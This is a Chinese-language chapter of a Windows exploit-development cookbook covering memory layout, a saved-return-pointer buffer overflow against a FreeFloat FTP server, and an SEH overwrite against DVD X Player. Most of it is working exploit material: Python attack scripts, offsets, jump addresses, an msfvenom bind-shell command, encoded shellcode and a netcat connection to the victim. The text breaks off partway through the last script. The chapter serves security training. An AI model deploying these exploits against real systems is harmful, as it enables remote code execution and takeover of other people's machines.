# 第十三章：Windows 利用开发

在本章中，我们将涵盖以下配方：

+   Windows 内存布局

+   使用保存的返回指针覆盖的缓冲区溢出攻击

+   结构化异常处理（SEH）

+   蛋猎手

# 介绍

本章将介绍一些基于 Windows 的漏洞以及使用 Python 的利用技术。利用开发任务的解决方案是用我们的指令替换程序指令，以操纵应用程序行为。我们将使用 Immunity Debugger 来调试应用程序。由于受害机器将是 Windows 机器，我们需要一台安装了 Windows XP 操作系统的机器。我们使用旧版 XP 以便于利用，并且具有漏洞的示例应用程序将在 XP 中运行。

# Windows 内存布局

Windows 操作系统内存有许多部分，可以被视为高级组件。为了编写利用并利用有漏洞的程序，我们必须了解内存结构及其各个部分。

# 准备工作

在开始编写利用脚本之前，我们必须了解 Windows 内存布局的结构。

让我们来看一下可执行文件的内存结构：

![](img/00073.gif)

由于在大多数利用中我们使用堆栈和堆，我们可以从这些开始。

# 堆栈

堆栈用于有序的短期本地存储。应用程序中的每个线程都有一个堆栈。当调用线程或函数时，为其分配一个具有固定大小的唯一堆栈。堆栈的大小在应用程序或线程启动时定义。此堆栈在函数或线程完成时被销毁。堆栈主要用于存储局部变量、保存函数返回指针、函数参数异常处理程序记录等。

堆栈从堆栈底部到顶部构建数据，从高内存地址到低内存地址：

![](img/00074.jpeg)

# 堆

堆是用于动态分配内存的。当应用程序不知道将接收或处理的数据时，堆将用于存储以无序方式分配的全局变量和值。堆仅在应用程序终止时才被释放。

堆的增长与堆栈相反。它从较低的地址增长到较高的地址：

![](img/00075.jpeg)

# 程序映像和动态链接库

程序映像是实际可执行文件存储在内存中的位置。可执行文件将以**可移植可执行文件**（**PE**）格式存在，并包括可执行文件和 DLL。在这个部分中，定义了一些项目，如 PE 头、`.text`、`.rdata`、`.data`等。PE 头定义了可执行文件的其余部分的头信息，`.text`包括代码段。`.rdata`是只读数据段，`.rsrc`是存储可执行文件的资源，如图标、菜单和字体的部分。

# 进程环境块（PEB）

当我们运行一个应用程序时，该可执行文件的一个实例将作为一个进程运行，并提供运行该应用程序所需的资源。存储运行进程的非内核组件的进程属性是 PEB。此外，PEB 驻留在用户可访问的内存中。

有关 PEB 结构的更多详细信息，请访问此链接：[`msdn.microsoft.com/en-us/library/windows/desktop/aa813706(v=vs.85).aspx`](https://msdn.microsoft.com/en-us/library/windows/desktop/aa813706(v=vs.85).aspx)

# 线程环境块（TEB）

一些进程可能有一个或多个线程。在这种情况下，每个进程都从一个单一的主线程开始，并在需要时创建更多的附加线程。此外，所有这些线程共享相同的虚拟地址。每个线程都有自己的资源，包括异常处理程序、本地存储等。因此，就像 PEB 一样，每个线程都有 TEB。TEB 也驻留在进程地址空间中。

您可以在以下文章中了解有关进程和线程的更多信息：[`msdn.microsoft.com/en-us/library/windows/desktop/ms681917(v=vs.85).aspx`](https://msdn.microsoft.com/en-us/library/windows/desktop/ms681917(v=vs.85).aspx) 此外，有关 TEB 结构的更多信息可以在此处找到：[`msdn.microsoft.com/en-us/library/windows/desktop/ms686708(v=vs.85).aspx`](https://msdn.microsoft.com/en-us/library/windows/desktop/ms686708(v=vs.85).aspx)

我们需要一个安装了 Immunity Debugger 的 Windows XP 机器来分析示例应用程序。

# 如何做到...

以下是了解 Immunity Debugger 基本用法的步骤：

1.  在 Windows 机器中打开 Immunity Debugger。

1.  然后加载一个要在 Immunity Debugger 中分析的程序。从菜单中选择文件 | 打开并选择要监视的应用程序：

![](img/00076.jpeg)

1.  我们可以通过打开内存映射来查看内存映射。您可以从菜单查看 | 内存中打开它，或者按下*Alt* + *M*键：

![](img/00077.jpeg)

这将打开以下窗格：

![](img/00078.gif)

这是在 Immunity Debugger 中打开的应用程序的内存映射。这包括所有堆栈、堆、DLL 和可执行文件。

您可以按以下方式查看堆栈：

![](img/00079.gif)

DLLs 可以被识别如下：

![](img/00080.gif)

程序图像及其内容将如下所示：

![](img/00081.gif)

DLLs、TEB 和 PEB 将被识别如下：

![](img/00082.gif)

1.  我们可以通过右键单击地址并选择转储选项来获取 PEB 和 TEB 的内存转储：

![](img/00083.gif)

# 使用保存的返回指针覆盖的缓冲区溢出

在本教程中，我们将讨论利用具有缓冲区溢出漏洞和保存的返回指针覆盖的应用程序。

# 做好准备

我们可以使用**FreeflotFTP**作为易受攻击的应用程序。您可以从以下网址获取该应用程序：[`rejahrehim.com/assets/sample-package/ftp_server_sample.zip`](https://rejahrehim.com/assets/sample-package/ftp_server_sample.zip)。

易受攻击的机器环境是 Windows XP。因此在真实或虚拟环境中运行 Windows XP 并在其中安装 Immunity Debugger。

# 安装 Mona

我们需要安装 Mona，这是 Immunity Debugger 的`pycommand`模块。为此，请从以下网址下载`mona.py`：[`github.com/corelan/mona`](https://github.com/corelan/mona)。

然后，将`mona.py`添加到`Immunity Debugger`应用程序文件夹内的`pyCommands`文件夹中：

![](img/00084.jpeg)

# 如何做到...

按照以下步骤创建缓冲区溢出攻击的利用：

1.  在 Windows 机器上，启动 Immunity Debugger 并在其中打开易受攻击的应用程序。

1.  由于它是一个 FTP 服务器，我们可以尝试通过从另一台机器连接来使应用程序崩溃。

1.  我们可以编写一个 Python 脚本来连接到 FTP 服务器。为此，创建一个名为`ftp_exploit.py`的文件并在编辑器中打开它：

```py
#!/usr/bin/python  
import socket 
import sys   
evil = "A"*1000   
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
connect=s.connect(('192.168.1.39',21))   
s.recv(1024) 
s.send('USER anonymous\r\n') 
s.recv(1024) 
s.send('PASS anonymous\r\n') 
s.recv(1024) 
s.send('MKD ' + evil + '\r\n') 
s.recv(1024) 
s.send('QUIT\r\n') 
s.close  
```

这将在 Windows 机器上创建大量数据并将其发送到 FTP 服务器。通过发送这个，程序将崩溃：

![](img/00085.jpeg)

在这里，您可以看到 EIP 寄存器被我们提供的缓冲区覆盖。此外，ESP 和 EDI 寄存器也包含我们的缓冲区。

1.  接下来，我们需要分析崩溃。为了做到这一点，我们需要用模式替换有效负载中的`A`。我们可以使用以下脚本生成模式：[`github.com/Svenito/exploit-pattern`](https://github.com/Svenito/exploit-pattern)。

下载脚本

1.  我们需要生成一个与我们之前提供的完全相同的有效负载模式。使用脚本下载，生成包含 1,000 个字符的模式。复制生成的模式：

![](img/00086.jpeg)

1.  使用模式作为有效负载更新 Python 脚本。因此，请在脚本中替换以下行：

```py
evil = "A"*1000 
```

使用以下代码：

```py
evil = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B" 

```

1.  现在重新启动在测试机器中运行的 Immunity Debugger 中的应用程序：

![](img/00087.jpeg)

1.  然后再次运行 Python 脚本：

![](img/00088.gif)

这也会使应用程序崩溃，但 EIP 寄存器会更新为我们注入的模式的一部分

1.  现在我们可以使用`mona`来分析崩溃。在 Immunity Debugger 控制台中运行以下命令：

```py
!mona findmsp    
```

输出将如下所示：

![](img/00089.jpeg)

从中我们可以确定 EIP 寄存器被 247 后的 4 个字节覆盖了。

1.  现在我们可以更新模式，确切地覆盖 EIP 寄存器为我们想要的数据。

因此，我们可以尝试在前 247 个位置写入 A，然后在 EIP 寄存器中写入 4 个 B，并用 C 填充，因为我们需要 1000 个。然后用新的有效载荷更新 Python 脚本：

```py
evil = "A"*247 + "B"*4 + "C"*749      
```

在调试器中重新启动应用程序并再次运行 Python 脚本。这也会使应用程序崩溃。但是，检查寄存器：

![](img/00090.gif)

现在 EIP 被我们提供的值覆盖了。这里是`42424242`，也就是`BBBB`。

1.  现在我们必须用指针替换`BBBB`，以将执行流重定向到 ESP 寄存器。我们可以利用`mona`来找到这个指针：

```py
!mona jmp -r esp    
```

输出将如下所示：

![](img/00091.gif)

我们可以使用列表中的第一个指针，即`77def069`。

1.  现在用我们选择的指针来制作有效载荷。确保反转字节顺序以匹配 CPU 的小端架构。在`evil`中更新 Python 脚本的以下值：

```py
evil = "A"*247 + "\x69\xf0\xde\x77" + "C"*749  
```

现在在 Immunity Debugger 中重新启动应用程序，并在`77def069`处设置断点。您可以使用 Immunity Debugger 中的 Go to 选项转到该地址：

![](img/00092.jpeg)![](img/00093.jpeg)

设置断点如下：

![](img/00094.jpeg)

选择内存，选择访问选项。

然后运行 Python 脚本。这将在断点处使应用程序中断，我们可以查看寄存器如下：

![](img/00095.jpeg)

1.  现在我们可以从 Metasploit 生成 shell 代码并将其包含在有效载荷中：

```py
msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00\x0A\x0D' -i 3 -f python 
```

![](img/00096.jpeg)

1.  用 shell 代码更新脚本。然后脚本将如下所示：

```py
#!/usr/bin/python   
import socket 
import sys  
buf =  "" 
buf += "\xbf\x9e\xc5\xad\x85\xdb\xd5\xd9\x74\x24\xf4\x5e\x2b" 
buf += "\xc9\xb1\x5b\x83\xee\xfc\x31\x7e\x11\x03\x7e\x11\xe2" 
buf += "\x6b\x7f\xe5\xd1\x52\x2f\x2c\x11\x8d\x44\xf5\x56\x73" 
buf += "\x94\x3c\x27\xde\xe7\xe8\x5a\x63\xc1\x11\x58\x7d\x94" 
buf += "\x3a\x04\xc4\x94\x24\x50\x67\x99\x3f\x8a\x42\x38\xa1" 
buf += "\x5d\x62\xd7\x19\x04\xbb\x10\x79\x3c\xf1\x22\x2d\x15" 
buf += "\x50\x23\x53\xe3\xb6\xe5\x7e\xc1\xe1\x89\x97\x85\xa2" 
buf += "\xbc\xbd\x3b\xb9\xbb\x71\x02\xde\x93\xe3\xc0\x22\x24" 
buf += "\xa5\x5d\x88\x4d\x31\xe6\xf9\xa2\xaf\x87\xd3\xc0\xaf" 
buf += "\xc3\xa5\x06\x8b\xb7\xac\xf0\x18\x10\x6b\xc4\xb4\x71" 
buf += "\xdf\x88\xd7\xda\xe0\x34\xa5\x88\xe0\x38\x6f\x6a\x06" 
buf += "\xbe\xe5\x63\xe3\xc8\x09\x91\xee\x9c\x75\x23\xe3\x7c" 
buf += "\xb5\xe9\xef\xc7\x12\x1e\x05\xa8\x26\x9e\xed\x7e\x86" 
buf += "\xce\x78\xec\x7e\x6e\x3b\x91\xa2\x8d\x1c\xc0\x08\x80" 
buf += "\xd2\x78\x88\xbd\xb7\xf5\x7e\x84\x51\x88\x5a\xa8\xbe" 
buf += "\x83\x9b\x46\x59\xbb\xb1\xe3\xd3\x52\xbe\x06\x2a\xbb" 
buf += "\xbc\x2a\x43\xb0\x6f\x91\x66\x73\x81\x58\x03\xc1\x03" 
buf += "\xa8\xf2\xe8\x3d\x9c\x69\x98\x59\xb4\x0c\x55\x85\x30" 
buf += "\x14\x49\x27\x9f\xfa\x79\x38\x6e\xfc\xf5\x49\x14\x83" 
buf += "\x64\x40\x5f\x52\xd7\xf1\x62\xec\xa6\xf0\x3d\xb9\xb7" 
buf += "\xd3\xa4\x17\xd0\xb2\x54\xb0\x82\x4b\xde\x2e\xd9\xda" 
buf += "\x34\xfb\xc3\xfa\xfc\xc9\xde\x24\x9f\x60\x03\xf5\xc0" 
buf += "\xcd\x33\x61\xd2\xe7\xd5\xce\xa3\xb1\xcc\x5d\x29\x94" 
buf += "\x20\xe5\x8f\xa8\x30\x0e\x0b\x78\x72\xd7\x88\x46\xa4" 
buf += "\x7e\x09\x5b\x8d\xff\xd8\x89\xb0\x86\xc4\x3d\x25\xf4" 
buf += "\x52\xdf\xa7\xde\x6b\x04\xce\x52\xa2\xa1\xb5\x7c\x2e" 
buf += "\x14\xee\xe1\x8d\xb9\x5d\xa5\x22\xd0\x5d\xd2\x61\xfa" 
buf += "\x3c\xae\xa3\x76\xca\x30\xcd\xe0\x74\xb8\x75\x7e\x0b" 
buf += "\x81\xf6\x03\x71\x07\x17\x6d\xf6\xa5\xf9\xdd\x42\xe8" 
buf += "\x6f\x82\x65\x6d\x92\xd5\x17\x85\x82\x48\x04\x53\xde"  
buffer = "\x90"*20 + buf 
evil = "A"*247 + "\x59\x54\xC3\x77" + buffer + "C"*(749-len(buffer))  
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
connect=s.connect(('192.168.1.37',21)) 
print (connect)  
s.recv(1024) 
s.send('USER anonymous\r\n') 
s.recv(1024) 
s.send('PASS anonymous\r\n') 
s.recv(1024) 
s.send('MKD ' + evil + '\r\n') 
s.recv(1024) 
s.send('QUIT\r\n') 
s.close 
```

1.  在调试器中重新启动应用程序并运行 Python 脚本。这将注入 shell 代码。现在我们可以尝试用`nc`连接受害机：

```py
nc -nv 192.168.1.37 4444  
```

![](img/00097.jpeg)

# 结构化异常处理

**结构化异常处理**（SEH）是一种防止缓冲区溢出的保护机制。SEH 使用链表，因为它包含一系列数据记录。当发生异常时，操作系统将遍历此列表并检查适当的异常函数。为此，异常处理程序需要指向当前异常注册记录（SEH）的指针和指向下一个异常注册记录（nSEH）的另一个指针。由于 Windows 堆栈向下增长，顺序将被颠倒：

![](img/00098.gif)

因此，如果我们可以用`POP POP RETN`指令覆盖 SEH，POP 将从堆栈顶部移除四个字节，RETN 将返回执行到堆栈顶部。由于 SEH 位于`esp+8`，我们可以用八个字节增加堆栈，并返回到堆栈顶部的新指针。然后我们将执行 nSEH。因此，我们可以添加一个四字节的操作码来跳转到另一个内存位置，我们可以在其中包含 shell。

# 准备工作

在这个教程中，我们将使用另一个易受攻击的应用程序：DVD X Player 5.5 PRO。您可以从以下网址下载：[`rejahrehim.com/assets/sample-package/dvd_player_sample.zip`](https://rejahrehim.com/assets/sample-package/dvd_player_sample.zip)。

与上一个教程一样，我们需要一台受害机器，安装有 Immunity Debugger 和`mona.py`的 Windows XP。还要在 Windows 机器上安装下载的应用程序 DVD X Player 5.5 PRO。

# 如何做...

以下是为 SEH 攻击创建利用脚本的步骤：

1.  在 Windows 机器上启动 Immunity Debugger 并将易受攻击的应用程序附加到其中：

![](img/00099.jpeg)![](img/00100.jpeg)

1.  创建一个名为`dvd_exploit.py`的 Python 文件来利用 DVD 播放器，并在编辑器中打开它。

1.  由于我们正在基于文件格式创建利用，我们将创建一个播放列表文件（.plf），其中包含一个很长的缓冲区，并允许 DVD 播放器读取它。由于缓冲区很长，DVD 播放器将因缓冲区溢出而崩溃。因此，受害者需要打开播放列表文件：

```py
#!/usr/bin/python 
filename="evil.plf"  
buffer = "A"*2000    
textfile = open(filename , 'w') 
textfile.write(buffer) 
textfile.close()  
```

1.  然后通过运行 Python 脚本创建播放列表文件并用播放器打开它：

```py
python dvd_exploit.py 
```

这将创建一个`evil.plf`文件

1.  在 DVD 播放器中打开它。然后播放器会崩溃。

检查崩溃的寄存器。还可以使用*Shift* + *F9*键通过崩溃：

![](img/00101.gif)

在寄存器中有许多零，因为 SEH 将它们清零。然后我们可以检查 SEH 链以验证我们是否已覆盖了 SEH：

![](img/00102.jpeg)

现在，我们可以生成一个模式并更新脚本以生成播放列表文件。我们已经下载了一个脚本来为之前的配方生成模式。我们可以使用相同的脚本：

```py
python exploit-pattern/pattern.py 2000    
```

1.  更新 Python 脚本中的`pattern`并生成有效载荷文件：

```py
#!/usr/bin/python  
filename="evil.plf"  
buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"  
textfile = open(filename , 'w') 
textfile.write(buffer) 
textfile.close() 
```

1.  在应用程序中打开生成的播放列表文件。它会崩溃。现在我们可以使用`mona.py`来分析崩溃并获取详细信息。为此，在 Immunity Debugger 控制台中运行以下命令：

```py
!mona findmsp 
```

![](img/00103.jpeg)

从中我们可以推断出 SEH 是 608 之后的 4 个字节。

1.  因此，我们可以制作我们的测试有效载荷，使其类似于`buffer = "A"*604 + [nSEH] + [SEH] + "D"*1384`。我们可以为 nSEH 添加`BBBB`，为 SEH 添加`CCCC`：

```py
buffer = "A"*604 + "B"*4 + "C"*4 + "D"*1388 
```

然后我们的脚本将如下所示：

```py
#!/usr/bin/python  
filename="evil.plf"     
buffer = "A"*604 + "B"*4 + "C"*4 + "D"*1388 
textfile = open(filename , 'w') 
textfile.write(buffer) 
textfile.close() 
```

1.  运行脚本并生成播放列表文件，然后用应用程序打开它。

1.  现在我们需要获得一个有效的指针，因为我们需要用指针覆盖 SEH。为了做到这一点，我们可以使用`mona.py`：

```py
!mona seh  
```

输出将如下所示：

![](img/00104.jpeg)

从中选择`s`指针。在这里我们可以选择以下一个：

```py
0x61617619 : pop esi # pop edi # ret  | asciiprint,ascii {PAGE_EXECUTE_READ} [EPG.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v1.12.21.2006 (C:\Program Files\Aviosoft\DVD X Player 5.5 Professional\EPG.dll)
```

1.  现在我们可以更新脚本中的`buffer`，将其写入 SEH：

```py
buffer = "A"*604 + "B"*4 + "\x19\x76\x61\x61" + "D"*1388  
```

1.  现在，我们的脚本将如下所示：

```py
#!/usr/bin/python  
filename="evil.plf" 
buffer = "A"*604 + "B"*4 + "\x19\x76\x61\x61" + "D"*1388 
textfile = open(filename , 'w') 
textfile.write(buffer) 
textfile.close() 
```

1.  运行脚本并生成播放列表文件并在 SEH 处设置断点。然后，将其加载到 DVD 播放器应用程序中。现在检查 SEH 内存位置。我们可以发现我们放在 SEH 中的指针被转换为操作码：

![](img/00105.gif)

1.  接下来，我们可以插入一个操作码，使 nSEH 向我们的填充区域进行短跳转。

1.  现在我们可以使用 Metasploit 生成 shell 代码，并更新脚本以包含 shell 代码。我们可以使用为之前的配方生成的相同 shell 代码。现在我们的利用代码将如下所示：

```py
#!/usr/bin/python    
filename="evil.plf"  
buf =  "" 
buf += "\xbf\x9e\xc5\xad\x85\xdb\xd5\xd9\x74\x24\xf4\x5e\x2b" 
buf += "\xc9\xb1\x5b\x83\xee\xfc\x31\x7e\x11\x03\x7e\x11\xe2" 
buf += "\x6b\x7f\xe5\xd1\x52\x2f\x2c\x11\x8d\x44\xf5\x56\x73" 
buf += "\x94\x3c\x27\xde\xe7\xe8\x5a\x63\xc1\x11\x58\x7d\x94" 
buf += "\x3a\x04\xc4\x94\x24\x50\x67\x99\x3f\x8a\x42\x38\xa1" 
buf += "\x5d\x62\xd7\x19\x04\xbb\x10\x79\x3c\xf1\x22\x2d\x15" 
buf += "\x50\x23\x53\xe3\xb6\xe5\x7e\xc1\xe1\x89\x97\x85\xa2" 
buf += "\xbc\xbd\x3b\xb9\xbb\x71\x02\xde\x93\xe3\xc0\x22\x24" 
buf += "\xa5\x5d\x88\x4d\x31\xe6\xf9\xa2\xaf\x87\xd3\xc0\xaf" 
buf += "\xc3\xa5\x06\x8b\xb7\xac\xf0\x18\x10\x6b\xc4\xb4\x71" 
buf += "\xdf\x88\xd7\xda\xe0\x34\xa5\x88\xe0\x38\x6f\x6a\x06" 
buf += "\xbe\xe5\x63\xe3\xc8\x09\x91\xee\x9c\x75\x23\xe3\x7c" 
buf += "\xb5\xe9\xef\xc7\x12\x1e\x05\xa8\x26\x9e\xed\x7e\x86" 
buf += "\xce\x78\xec\x7e\x6e\x3b\x91\xa2\x8d\x1c\xc0\x08\x80" 
buf += "\xd2\x78\x88\xbd\xb7\xf5\x7e\x84\x51\x88\x5a\xa8\xbe" 
buf += "\x83\x9b\x46\x59\xbb\xb1\xe3\xd3\x52\xbe\x06\x2a\xbb" 
buf += "\xbc\x2a\x43\xb0\x6f\x91\x66\x73\x81\x58\x03\xc1\x03" 
buf += "\xa8\xf2\xe8\x3d\x9c\x69\x98\x59\xb4\x0c\x55\x85\x30" 
buf += "\x14\x49\x27\x9f\xfa\x79\x38\x6e\xfc\xf5\x49\x14\x83" 
buf += "\x64\x40\x5f\x52\xd7\xf1\x62\xec\xa6\xf0\x3d\xb9\xb7" 
buf += "\xd3\xa4\x17\xd0\xb2\x54\xb0\x82\x4b\xde\x2e\xd9\xda" 
buf += "\x34\xfb\xc3\xfa\xfc\xc9\xde\x24\x9f\x60\x03\xf5\xc0" 
buf += "\xcd\x33\x61\xd2\xe7\xd5\xce\xa3\xb1\xcc\x5d\x29\x94" 
buf += "\x20\xe5\x8f\xa8\x30\x0e\x0b\x78\x72\xd7\x88\x46\xa4" 
buf += "\x7e\x09\x5b\x8d\xff\xd8\x89\xb0\x86\xc4\x3d\x25\xf4" 
buf += "\x52\xdf\xa7\xde\x6b\x04\xce\x52\xa2\xa1\xb5\x7c\x2e" 
buf += "\x14\xee\xe1\x8d\xb9\x5d\xa5\x22\xd0\x5d\xd2\x61\xfa" 
buf += "\x3c\xae\xa3\x76\xca\x30\xcd\xe0\x74\xb8\x75\x7e\x0b" 
buf += "\x81\xf6\x03\x71\x07\x17\x6d\xf6\xa5\xf9\xdd\x42\xe8" 
buf += "\x6f\x82\x65\x6d\x92\xd5\x17\x85\x82\x48\x04\x53\xde"  
#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2B